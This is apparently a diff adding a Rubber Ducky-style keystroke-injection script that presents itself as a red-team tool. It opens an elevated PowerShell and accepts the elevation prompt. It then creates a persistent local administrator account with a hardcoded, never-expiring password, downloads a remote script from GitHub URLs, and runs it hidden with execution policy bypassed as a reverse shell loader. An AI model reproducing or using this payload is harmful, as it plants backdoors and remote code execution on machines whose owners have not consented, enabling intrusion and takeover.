@@ -1,0 +1,60 @@
+REM ==================================================
+REM  remote admin backdoor + reverse shell loader
+REM  Authorized red-team use only
+REM ==================================================
+
+REM --- Stage 1: elevated PowerShell ---
+GUI x
+DELAY 1500
+a
+DELAY 1500
+ALT y
+DELAY 2000
+
+REM --- Stage 2: create / reuse local admin (idempotent) ---
+STRING $u='reconhawk'
+ENTER
+DELAY 500
+STRING $p='R3c0nH@wk!2024x'
+ENTER
+DELAY 500
+STRING $adsi=[ADSI]"WinNT://$env:COMPUTERNAME"
+ENTER
+DELAY 1000
+STRING $existing=$adsi.Children | Where-Object { $_.SchemaClassName -eq 'user' -and $_.Name -eq $u }
+ENTER
+DELAY 1500
+STRING if($existing){ $existing.SetPassword($p) } else { & NET USER $u $p /add /expires:never }
+ENTER
+DELAY 2000
+STRING Add-LocalGroupMember -SID S-1-5-32-544 -Member $u -ErrorAction SilentlyContinue
+ENTER
+DELAY 1500
+STRING Set-LocalUser -Name $u -PasswordNeverExpires $true -ErrorAction SilentlyContinue
+ENTER
+DELAY 1500
+
+REM --- Stage 3: fetch + launch reverse shell (hidden, detached, fallback + retry) ---
+STRING [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+ENTER
+DELAY 500
+STRING $urls=@('https://raw.githubusercontent.com/Hug1n/admin_tools/remote_admin_tool.ps1','https://raw.githubusercontent.com/Hug1n/admin_tools/remote_admin.ps1')
+ENTER
+DELAY 500
+STRING $code=$null; foreach($u in $urls){ try{ $code=(Invoke-WebRequest $u -UseBasicParsing).Content; if($code){ break } } catch { Start-Sleep 3 } }
+ENTER
+DELAY 1500
+STRING if($code){ $code | Out-File "C:\Windows\Temp\ra.ps1" -Encoding ascii; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','C:\Windows\Temp\ra.ps1' }
+ENTER
+DELAY 2000
+
+REM --- Stage 4: clean exit, hide window ---
+STRING exit
+ENTER
+DELAY 500
+ALT SPACE
+DELAY 300
+DOWN
+DOWN
+DOWN
+ENTER
